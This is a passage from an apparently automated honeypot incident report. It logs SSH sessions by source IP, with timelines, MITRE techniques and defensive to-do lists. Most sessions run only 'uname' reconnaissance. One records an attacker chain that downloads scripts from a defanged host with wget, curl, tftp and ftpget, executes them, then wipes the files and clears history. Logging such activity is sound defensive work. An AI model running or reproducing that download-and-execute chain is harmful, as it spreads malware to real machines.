| `2026-06-25 07:25:35` | `cowrie.session.params` |
| `2026-06-25 07:25:35` | `cowrie.command.input` |
| `2026-06-25 07:25:35` | `cowrie.log.closed` |
| `2026-06-25 07:25:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0222213eebb

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:25 |
| **Last Seen** | 2026-06-25 07:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:25:44` | `cowrie.session.connect` |
| `2026-06-25 07:25:44` | `cowrie.client.version` |
| `2026-06-25 07:25:44` | `cowrie.client.kex` |
| `2026-06-25 07:25:45` | `cowrie.login.success` |
| `2026-06-25 07:25:46` | `cowrie.session.params` |
| `2026-06-25 07:25:46` | `cowrie.command.input` |
| `2026-06-25 07:25:46` | `cowrie.log.closed` |
| `2026-06-25 07:25:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-885cdbbb17cf

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:26 |
| **Last Seen** | 2026-06-25 07:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:26:13` | `cowrie.session.connect` |
| `2026-06-25 07:26:13` | `cowrie.client.version` |
| `2026-06-25 07:26:13` | `cowrie.client.kex` |
| `2026-06-25 07:26:14` | `cowrie.login.success` |
| `2026-06-25 07:26:15` | `cowrie.session.params` |
| `2026-06-25 07:26:15` | `cowrie.command.input` |
| `2026-06-25 07:26:15` | `cowrie.log.closed` |
| `2026-06-25 07:26:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16da564df044

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:26 |
| **Last Seen** | 2026-06-25 07:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:26:30` | `cowrie.session.connect` |
| `2026-06-25 07:26:30` | `cowrie.client.version` |
| `2026-06-25 07:26:30` | `cowrie.client.kex` |
| `2026-06-25 07:26:30` | `cowrie.login.success` |
| `2026-06-25 07:26:31` | `cowrie.session.params` |
| `2026-06-25 07:26:31` | `cowrie.command.input` |
| `2026-06-25 07:26:31` | `cowrie.log.closed` |
| `2026-06-25 07:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58f2756043c1

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:27 |
| **Last Seen** | 2026-06-25 07:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:27:17` | `cowrie.session.connect` |
| `2026-06-25 07:27:17` | `cowrie.client.version` |
| `2026-06-25 07:27:17` | `cowrie.client.kex` |
| `2026-06-25 07:27:18` | `cowrie.login.success` |
| `2026-06-25 07:27:19` | `cowrie.session.params` |
| `2026-06-25 07:27:19` | `cowrie.command.input` |
| `2026-06-25 07:27:19` | `cowrie.log.closed` |
| `2026-06-25 07:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eaf9caabac4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:27 |
| **Last Seen** | 2026-06-25 07:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:27:26` | `cowrie.session.connect` |
| `2026-06-25 07:27:26` | `cowrie.client.version` |
| `2026-06-25 07:27:26` | `cowrie.client.kex` |
| `2026-06-25 07:27:27` | `cowrie.login.success` |
| `2026-06-25 07:27:27` | `cowrie.session.params` |
| `2026-06-25 07:27:27` | `cowrie.command.input` |
| `2026-06-25 07:27:28` | `cowrie.log.closed` |
| `2026-06-25 07:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bdfcd932f1e

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:28 |
| **Last Seen** | 2026-06-25 07:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:28:22` | `cowrie.session.connect` |
| `2026-06-25 07:28:22` | `cowrie.client.version` |
| `2026-06-25 07:28:22` | `cowrie.client.kex` |
| `2026-06-25 07:28:23` | `cowrie.login.success` |
| `2026-06-25 07:28:24` | `cowrie.session.params` |
| `2026-06-25 07:28:24` | `cowrie.command.input` |
| `2026-06-25 07:28:24` | `cowrie.log.closed` |
| `2026-06-25 07:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d150cd120a6

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:28 |
| **Last Seen** | 2026-06-25 07:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:28:22` | `cowrie.session.connect` |
| `2026-06-25 07:28:22` | `cowrie.client.version` |
| `2026-06-25 07:28:22` | `cowrie.client.kex` |
| `2026-06-25 07:28:23` | `cowrie.login.success` |
| `2026-06-25 07:28:24` | `cowrie.session.params` |
| `2026-06-25 07:28:24` | `cowrie.command.input` |
| `2026-06-25 07:28:25` | `cowrie.log.closed` |
| `2026-06-25 07:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a63db8514f4b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:28 |
| **Last Seen** | 2026-06-25 07:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:28:23` | `cowrie.session.connect` |
| `2026-06-25 07:28:23` | `cowrie.client.version` |
| `2026-06-25 07:28:23` | `cowrie.client.kex` |
| `2026-06-25 07:28:23` | `cowrie.login.success` |
| `2026-06-25 07:28:25` | `cowrie.session.params` |
| `2026-06-25 07:28:25` | `cowrie.command.input` |
| `2026-06-25 07:28:25` | `cowrie.log.closed` |
| `2026-06-25 07:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-433f25bef05b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:29 |
| **Last Seen** | 2026-06-25 07:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:29:17` | `cowrie.session.connect` |
| `2026-06-25 07:29:17` | `cowrie.client.version` |
| `2026-06-25 07:29:17` | `cowrie.client.kex` |
| `2026-06-25 07:29:17` | `cowrie.login.success` |
| `2026-06-25 07:29:18` | `cowrie.session.params` |
| `2026-06-25 07:29:18` | `cowrie.command.input` |
| `2026-06-25 07:29:18` | `cowrie.log.closed` |
| `2026-06-25 07:29:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7626ebcec7e1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:30 |
| **Last Seen** | 2026-06-25 07:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:30:11` | `cowrie.session.connect` |
| `2026-06-25 07:30:11` | `cowrie.client.version` |
| `2026-06-25 07:30:11` | `cowrie.client.kex` |
| `2026-06-25 07:30:11` | `cowrie.login.success` |
| `2026-06-25 07:30:12` | `cowrie.session.params` |
| `2026-06-25 07:30:12` | `cowrie.command.input` |
| `2026-06-25 07:30:12` | `cowrie.log.closed` |
| `2026-06-25 07:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f71bca536b9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:31 |
| **Last Seen** | 2026-06-25 07:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:31:08` | `cowrie.session.connect` |
| `2026-06-25 07:31:08` | `cowrie.client.version` |
| `2026-06-25 07:31:08` | `cowrie.client.kex` |
| `2026-06-25 07:31:08` | `cowrie.login.success` |
| `2026-06-25 07:31:09` | `cowrie.session.params` |
| `2026-06-25 07:31:09` | `cowrie.command.input` |
| `2026-06-25 07:31:09` | `cowrie.log.closed` |
| `2026-06-25 07:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f  (Bash Script)
   SHA256: 725d1de20672ed85f32e823fe067ed6eb17149019e146baf...
   Score : 84/100  |  VT: 36/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ chmod +x (make executable): chmod +x
   ↳ IP:Port (possible C2): 51.158.248[.]122:8517
```

### 🔴 HIGH · IR-db408fa5ec68

| Field | Detail |
|---|---|
| **Source IP** | `51.158.248[.]122` |
| **First Seen** | 2026-06-25 07:31 |
| **Last Seen** | 2026-06-25 07:32 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp; wget hxxp://51.158.248[.]122:8517/bins.sh; curl -O hxxp://51.158.248[.]122:8517/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 51.158.248[.]122 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.158.248[.]122; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.158.248[.]122 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; history -c` |
| **Download Attempts** | hxxp://51.158.248[.]122:8517/bins.sh, hxxp://51.158.248[.]122:8517/bins.sh, hxxp://51.158.248[.]122:8517/armv6l |
| **Malware Analysis** | 725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f (HIGH), 4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02 (MEDIUM), 494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984 (MEDIUM), 6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c (MEDIUM), 80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:31:59` | `cowrie.session.connect` |
| `2026-06-25 07:32:00` | `cowrie.login.success` |
| `2026-06-25 07:32:00` | `cowrie.session.params` |
| `2026-06-25 07:32:02` | `cowrie.command.input` |
| `2026-06-25 07:32:02` | `cowrie.command.input` |
| `2026-06-25 07:32:02` | `cowrie.session.file_download` |
| `2026-06-25 07:32:02` | `cowrie.session.file_download` |
| `2026-06-25 07:32:02` | `cowrie.session.file_download` |
| `2026-06-25 07:32:02` | `cowrie.session.file_download.failed` |
| `2026-06-25 07:32:02` | `cowrie.session.file_download` |
| `2026-06-25 07:32:03` | `cowrie.session.file_download` |
| `2026-06-25 07:32:03` | `cowrie.session.file_download` |
| `2026-06-25 07:32:03` | `cowrie.session.file_download` |
| `2026-06-25 07:32:03` | `cowrie.session.file_download` |
| `2026-06-25 07:32:03` | `cowrie.session.file_download` |
| `2026-06-25 07:32:04` | `cowrie.session.file_download` |
| `2026-06-25 07:32:17` | `cowrie.log.closed` |
| `2026-06-25 07:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.158.248[.]122` to AbuseIPDB if not already reported
- [ ] Block `51.158.248[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed767718c20a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:32 |
| **Last Seen** | 2026-06-25 07:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:32:04` | `cowrie.session.connect` |
| `2026-06-25 07:32:04` | `cowrie.client.version` |
| `2026-06-25 07:32:04` | `cowrie.client.kex` |
| `2026-06-25 07:32:04` | `cowrie.login.success` |
| `2026-06-25 07:32:05` | `cowrie.session.params` |
| `2026-06-25 07:32:05` | `cowrie.command.input` |
| `2026-06-25 07:32:05` | `cowrie.log.closed` |
| `2026-06-25 07:32:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54af705b5e62

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:32 |
| **Last Seen** | 2026-06-25 07:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:32:23` | `cowrie.session.connect` |
| `2026-06-25 07:32:23` | `cowrie.client.version` |
| `2026-06-25 07:32:23` | `cowrie.client.kex` |
| `2026-06-25 07:32:24` | `cowrie.login.success` |
| `2026-06-25 07:32:25` | `cowrie.session.params` |
| `2026-06-25 07:32:25` | `cowrie.command.input` |
| `2026-06-25 07:32:25` | `cowrie.log.closed` |
| `2026-06-25 07:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa784c7c53e6

| Field | Detail |
|---|---|
| **Source IP** | `111.23.129[.]238` |
| **First Seen** | 2026-06-25 07:32 |
| **Last Seen** | 2026-06-25 07:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:32:37` | `cowrie.session.connect` |
| `2026-06-25 07:32:38` | `cowrie.client.version` |
| `2026-06-25 07:32:38` | `cowrie.client.kex` |
| `2026-06-25 07:32:41` | `cowrie.login.success` |
| `2026-06-25 07:32:43` | `cowrie.session.params` |
| `2026-06-25 07:32:43` | `cowrie.command.input` |
| `2026-06-25 07:32:43` | `cowrie.log.closed` |
| `2026-06-25 07:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.23.129[.]238` to AbuseIPDB if not already reported
- [ ] Block `111.23.129[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee1f0c4cefca

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:33 |
| **Last Seen** | 2026-06-25 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:33:01` | `cowrie.session.connect` |
| `2026-06-25 07:33:01` | `cowrie.client.version` |
| `2026-06-25 07:33:01` | `cowrie.client.kex` |
| `2026-06-25 07:33:01` | `cowrie.login.success` |
| `2026-06-25 07:33:02` | `cowrie.session.params` |
| `2026-06-25 07:33:02` | `cowrie.command.input` |
| `2026-06-25 07:33:02` | `cowrie.log.closed` |
| `2026-06-25 07:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-786077cdd77d

| Field | Detail |
|---|---|
| **Source IP** | `49.84.226[.]110` |
| **First Seen** | 2026-06-25 07:33 |
| **Last Seen** | 2026-06-25 07:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:33:43` | `cowrie.session.connect` |
| `2026-06-25 07:33:43` | `cowrie.client.version` |
| `2026-06-25 07:33:43` | `cowrie.client.kex` |
| `2026-06-25 07:33:44` | `cowrie.login.success` |
| `2026-06-25 07:33:46` | `cowrie.session.params` |
| `2026-06-25 07:33:46` | `cowrie.command.input` |
| `2026-06-25 07:33:46` | `cowrie.log.closed` |
| `2026-06-25 07:33:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.84.226[.]110` to AbuseIPDB if not already reported
- [ ] Block `49.84.226[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd3e339dfa76

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:33 |
| **Last Seen** | 2026-06-25 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:33:58` | `cowrie.session.connect` |
| `2026-06-25 07:33:58` | `cowrie.client.version` |
| `2026-06-25 07:33:58` | `cowrie.client.kex` |
| `2026-06-25 07:33:58` | `cowrie.login.success` |
| `2026-06-25 07:33:59` | `cowrie.session.params` |
| `2026-06-25 07:33:59` | `cowrie.command.input` |
| `2026-06-25 07:33:59` | `cowrie.log.closed` |
| `2026-06-25 07:33:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff0a2480ec57

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:34 |
| **Last Seen** | 2026-06-25 07:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:34:02` | `cowrie.session.connect` |
| `2026-06-25 07:34:02` | `cowrie.client.version` |
| `2026-06-25 07:34:03` | `cowrie.client.kex` |
| `2026-06-25 07:34:03` | `cowrie.login.success` |
| `2026-06-25 07:34:04` | `cowrie.session.params` |
| `2026-06-25 07:34:04` | `cowrie.command.input` |
| `2026-06-25 07:34:04` | `cowrie.log.closed` |
| `2026-06-25 07:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34e7da2a4d1c

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:34 |
| **Last Seen** | 2026-06-25 07:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:34:18` | `cowrie.session.connect` |
| `2026-06-25 07:34:18` | `cowrie.client.version` |
| `2026-06-25 07:34:18` | `cowrie.client.kex` |
| `2026-06-25 07:34:18` | `cowrie.login.success` |
| `2026-06-25 07:34:19` | `cowrie.session.params` |
| `2026-06-25 07:34:19` | `cowrie.command.input` |
| `2026-06-25 07:34:20` | `cowrie.log.closed` |
| `2026-06-25 07:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af66802f0285

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:34 |
| **Last Seen** | 2026-06-25 07:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:34:20` | `cowrie.session.connect` |
| `2026-06-25 07:34:20` | `cowrie.client.version` |
| `2026-06-25 07:34:20` | `cowrie.client.kex` |
| `2026-06-25 07:34:21` | `cowrie.login.success` |
| `2026-06-25 07:34:21` | `cowrie.session.params` |
| `2026-06-25 07:34:21` | `cowrie.command.input` |
| `2026-06-25 07:34:22` | `cowrie.log.closed` |
| `2026-06-25 07:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4cafd2aacb7

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]108` |
| **First Seen** | 2026-06-25 07:34 |
| **Last Seen** | 2026-06-25 07:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, busybox TEST, cat /proc, /` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:34:26` | `cowrie.session.connect` |
| `2026-06-25 07:34:27` | `cowrie.login.success` |
| `2026-06-25 07:34:28` | `cowrie.session.params` |
| `2026-06-25 07:34:29` | `cowrie.command.input` |
| `2026-06-25 07:34:29` | `cowrie.command.input` |
| `2026-06-25 07:34:30` | `cowrie.command.input` |
| `2026-06-25 07:34:31` | `cowrie.command.input` |
| `2026-06-25 07:34:31` | `cowrie.log.closed` |
| `2026-06-25 07:34:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]108` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c1587f025cc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:34 |
| **Last Seen** | 2026-06-25 07:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:34:55` | `cowrie.session.connect` |
| `2026-06-25 07:34:55` | `cowrie.client.version` |
| `2026-06-25 07:34:55` | `cowrie.client.kex` |
| `2026-06-25 07:34:56` | `cowrie.login.success` |
| `2026-06-25 07:34:56` | `cowrie.session.params` |
| `2026-06-25 07:34:56` | `cowrie.command.input` |
| `2026-06-25 07:34:56` | `cowrie.log.closed` |
| `2026-06-25 07:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76d71fcda711

| Field | Detail |
|---|---|
